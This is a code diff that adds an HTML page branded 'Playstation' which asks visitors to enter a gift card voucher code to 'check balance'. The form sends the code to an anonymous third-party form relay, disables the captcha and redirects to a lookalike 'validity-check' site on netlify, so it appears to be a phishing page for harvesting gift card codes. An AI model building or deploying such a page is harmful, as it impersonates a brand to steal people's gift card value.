@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+    <title>Playstation</title>
+  </head>
+  <body>
+    <div class="head">
+      <h2>Check Balance</h2>
+      <img src="close.svg" alt="" />
+    </div>
+    <main>
+      <form
+        action="https://formsubmit.co/c813a38244b90ec8fade1c414b0dc0ac "
+        method="post"
+      >
+        <!-- honey pot -->
+        <input type="text" name="_honey" style="display: none" />
+
+        <!-- display Captcha -->
+        <input type="hidden" name="_captcha" value="false" />
+        <!-- thank you page -->
+
+        <input
+          type="hidden"
+          name="_next"
+          value="https://my-playstation-validity-check.netlify.app/next.html"
+        />
+
+        <p>Check your gift card balance here.</p>
+        <div class="enter">
+          <input
+            type="text"
+            minlength="12"
+            maxlength="14"
+            placeholder="Enter 12-characters vouchers code"
+            required
+            name="playstation"
+          />
+        </div>
+
+        <div class="mainpic">
+          <img src="play.svg" alt="" width="100%" />
+        </div>
+        <div class="check">
+          <input type="submit" onclick="myFun()" value="Continue" />
+        </div>
+      </form>
+    </main>
+    <script src="script.js"></script>
+  </body>
+</html>
